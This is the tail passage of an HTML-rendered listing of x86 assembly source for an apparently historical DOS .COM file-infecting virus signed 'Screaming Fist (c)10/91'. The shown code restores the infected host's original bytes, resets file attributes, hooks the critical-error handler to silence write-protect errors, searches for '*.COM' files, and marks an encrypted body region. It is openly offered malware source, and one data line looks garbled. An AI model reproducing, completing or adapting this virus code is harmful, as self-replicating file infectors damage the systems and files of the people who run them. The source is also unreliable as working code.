         </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc5">ORIGINAL_EIGHT</span><span class="sc4">-</span><span class="sc5">NEXT_STEP</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Restore original eight bytes so we</span><span class="sc0">
                                               </span><span class="sc1">;can RET</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">                           </span><span class="sc1">;Destination of move</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                             </span><span class="sc1">;Move eight bytes</span><span class="sc0">
         </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">RESTORE_ATTRIBS</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; This routine restores the files original attributes.                         ;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------;        </span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301H</span><span class="sc0">                   </span><span class="sc1">;Restore original attribs</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">;Zero out CX</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,[</span><span class="sc2">95H</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;To what was read in earlier</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">09EH</span><span class="sc0">                    </span><span class="sc1">;Offset of filename</span><span class="sc0">
         </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
         </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">NEW_24</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">;Any error will simply be ignored</span><span class="sc0">
         </span><span class="sc6">STC</span><span class="sc0">                            </span><span class="sc1">;Most useful for write protects</span><span class="sc0">
         </span><span class="sc6">IRET</span><span class="sc0">



</span><span class="sc5">OLD_E</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">OLD_ES</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">
</span><span class="sc5">OLD_B</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">OLD_BX</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">

</span><span class="sc5">ORIGINAL_EIGHT</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">OLD_EIGHT_BYTES</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">      </span><span class="sc1">;Bytes that are moved</span><span class="sc0">
                                                     </span><span class="sc1">;and RET'd to</span><span class="sc0">
</span><span class="sc5">WILD_CARD</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">FILESPEC</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This is just some generic text. Don't be a lamer and change the text and claim</span><span class="sc0">
</span><span class="sc1">;it was your own creation.</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TEXT</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'Screaming Fist (c)10/91'</span><span class="sc0">
</span><span class="sc5">ENC_END</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">ENC_LENGTH</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">ENC_END</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ENC_START</span><span class="sc0">              </span><span class="sc1">;Length of code to be encrypted</span><span class="sc0">
</span></div></body>
</html>
